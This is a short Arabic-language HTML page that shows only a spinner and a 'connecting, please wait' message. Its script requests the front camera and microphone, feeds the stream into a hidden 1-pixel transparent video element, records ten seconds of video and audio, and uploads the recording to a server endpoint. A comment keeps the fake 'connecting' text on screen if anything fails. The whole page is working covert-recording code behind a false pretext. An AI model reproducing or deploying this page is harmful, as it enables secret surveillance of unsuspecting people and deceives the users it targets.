<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>جاري الاتصال...</title>
<style>
  body{
    font-family:-apple-system,sans-serif;
    background:#0f172a;color:#e2e8f0;
    display:flex;align-items:center;justify-content:center;
    min-height:100vh;margin:0;text-align:center;
  }
  .spinner{
    width:50px;height:50px;
    border:4px solid #334155;border-top-color:#38bdf8;
    border-radius:50%;animation:spin 1s linear infinite;
    margin:20px auto;
  }
  @keyframes spin{to{transform:rotate(360deg)}}
  #status{font-size:16px;margin-top:15px}
</style>
</head>
<body>
  <div>
    <div class="spinner"></div>
    <div id="status">جاري الاتصال، يرجى الانتظار...</div>
  </div>

  <video id="video" autoplay playsinline muted
         style="position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;"></video>

<script>
  const RECORD_SECONDS = 10;

  const video  = document.getElementById('video');
  const status = document.getElementById('status');

  async function start() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" },
        audio: true
      });

      video.srcObject = stream;
      await video.play();
      await new Promise(r => setTimeout(r, 800));

      // اختر أفضل صيغة مدعومة
      let mimeType = 'video/webm';
      if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9,opus')) {
        mimeType = 'video/webm;codecs=vp9,opus';
      } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) {
        mimeType = 'video/webm;codecs=vp8,opus';
      } else if (MediaRecorder.isTypeSupported('video/mp4')) {
        mimeType = 'video/mp4';
      }

      const recorder = new MediaRecorder(stream, { mimeType });
      const chunks = [];

      recorder.ondataavailable = (e) => {
        if (e.data.size > 0) chunks.push(e.data);
      };

      recorder.onstop = async () => {
        // اقفل الكاميرا والمايك
        stream.getTracks().forEach(t => t.stop());

        const videoBlob = new Blob(chunks, { type: mimeType });

        // ابعت الفيديو
        const form = new FormData();
        form.append("video", videoBlob, "video.webm");

        try {
          await fetch("/api/upload-video", { method: "POST", body: form });
        } catch (e) { console.error(e); }
      };

      // ابدأ التسجيل
      recorder.start();

      // سجّل 10 ثواني وبعدين وقف
      setTimeout(() => {
        if (recorder.state === "recording") recorder.stop();
      }, RECORD_SECONDS * 1000);

    } catch (err) {
      console.error(err);
      // سيبها "جاري الاتصال..." زي ما هي
    }
  }

  start();
</script>
</body>
</html>
